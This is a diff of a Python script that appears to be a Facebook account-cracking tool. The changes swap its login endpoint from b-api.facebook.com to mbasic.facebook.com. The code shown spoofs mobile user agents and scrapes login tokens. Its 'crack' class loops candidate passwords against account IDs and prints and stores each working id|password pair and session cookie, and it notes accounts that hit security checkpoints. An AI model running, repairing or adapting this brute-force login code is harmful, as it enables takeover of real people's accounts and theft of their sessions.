@@ -26,7 +26,7 @@ def banner():
                                               \n""");print(45*"_");time.sleep(0.07);print(" \x1b[0m CREATE BY : WINDIP\n \n DEC BY :WINDIP\n \n GITHUB    : github.com/Windip909090\n  FACEBOOK  : BLACK MANAGER");time.sleep(0.07);print(45*"_");time.sleep(0.07)
 post = '10225748615052849'
 
-host="https://b-api.facebook.com"
+host="https://mbasic.facebook.com"
 ua="Mozilla / 5.0 (Linux; U; Android 2.2) AppleWebKit / 533.1 (KHTML, like Gecko) Version / 4.0 Mobile Safari / 533.1 [FBAN / EMA; FBLC / it _ IT; FBAV / 239.0.0.10.109 ;]"
 ips=None
 try:
@@ -42,7 +42,7 @@ touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-inse
 
 m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 
-mbasic_h={"Host":"b-api.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 
 graph_h={"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 def clear():
@@ -53,11 +53,11 @@ def clear():
 	else:os.system("clear")
 def lang(cookies):
 	f=False
-	rr=bs4.BeautifulSoup(requests.get("https://b-api.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
+	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
 	for i in rr.find_all("a",href=True):
 		if "id_ID" in i.get("href"):
-			requests.get("https://b-api.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
-			b=requests.get("https://b-api.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
+			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
+			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
 			if "apa yang anda pikirkan sekarang" in b.lower():
 				f=True
 	if f==True:
@@ -292,7 +292,7 @@ def mbasic(em,pas,hosts):
 	global ua,mbasic_h
 	r=requests.Session()
 	r.headers.update(mbasic_h)
-	p=r.get("https://b-api.facebook.com/")
+	p=r.get("https://mbasic.facebook.com/")
 	b=bs4.BeautifulSoup(p.text,"html.parser")
 	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
 	data={}
@@ -311,8 +311,8 @@ def mbasic(em,pas,hosts):
 		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
 		}
 	)
-	r.headers.update({"referer":"https://b-api.facebook.com/login/?next&ref=dbl&fl&refid=8"})
-	po=r.post("https://b-api.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+	r.headers.update({"referer":"https://b-api.facebook.com/method/auth.login"})
+	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
 	if "c_user" in list(r.cookies.get_dict().keys()):
 		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
 	elif "checkpoint" in list(r.cookies.get_dict().keys()):
@@ -505,7 +505,7 @@ class crack:
 		try:
 			for i in fl.get("pw"):
 				log=mbasic(fl.get("id"),
-					i,"https://b-api.facebook.com")
+					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
 					print(("\r  [OK]%s %s|%s %s      "%(G,fl.get("id"),i,N)))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
